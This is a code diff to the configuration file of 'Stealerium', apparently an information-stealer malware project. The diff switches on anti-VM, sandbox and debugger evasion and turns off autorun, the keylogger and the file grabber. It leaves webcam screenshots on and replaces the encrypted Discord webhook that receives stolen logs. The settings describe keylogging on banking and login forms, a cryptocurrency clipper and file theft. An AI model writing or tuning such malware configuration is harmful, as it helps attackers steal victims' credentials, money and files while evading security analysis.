@@ -15,10 +15,10 @@ namespace Stealerium
         public static string Mutex = "ewf54wef564";
 
         // Anti VM, SandBox, Any.Run, Emulator, Debugger, Process
-        public static string AntiAnalysis = "0";
+        public static string AntiAnalysis = "1";
 
         // Drop and Hide executable to startup directory
-        public static string Autorun = "1";
+        public static string Autorun = "0";
 
         // Random start delay (0-10 seconds)
         public static string StartDelay = "0";
@@ -27,17 +27,17 @@ namespace Stealerium
         public static string WebcamScreenshot = "1";
 
         // Run keylogger when user opened log-in form, banking service or messenger
-        public static string KeyloggerModule = "1";
+        public static string KeyloggerModule = "0";
 
         // Run clipper when user opened cryptocurrency application
         public static string ClipperModule = "0";
 
         // File grabber:
-        public static string GrabberModule = "1";
+        public static string GrabberModule = "0";
 
         // Discord Webhook where to send captured logs
         public static string Webhook =
-            "ENCRYPTED:Z6wDfv2IxQbZmN3X8dQv3iFnArjC+Xh8XT65VFx/ST+IEkNK2bfVjSZEjgv86uAD/wFiJ8LmuzQ6Am+RfjVolqZDhoeN2SBIh5eBJGML0Stttb0eAAyFuBRpZEAZ27wnguf+Gtzue156grs+16rnt7ywK1gaGK/G4ivBsBpussc=";
+            "ENCRYPTED:fleaTKsR0trQiaWh0H+vOvHR4WDn0LEpdxH+edudpJFgHk0gqzZqQCrz+uijeyRD9bd90K68CTHNtovE8WK18CnFZZT8xgGBmQSEPuAUSPDHQqgVOeILB5awg4etFhtwJlPmQhKwgLhRgNNKFka8/ekJmadm1C0L2jqQNBRG8Bg=";
 #elif RELEASE
         // Debug mode (write all exceptions to file)
         public static string DebugMode = "--- Debug ---";
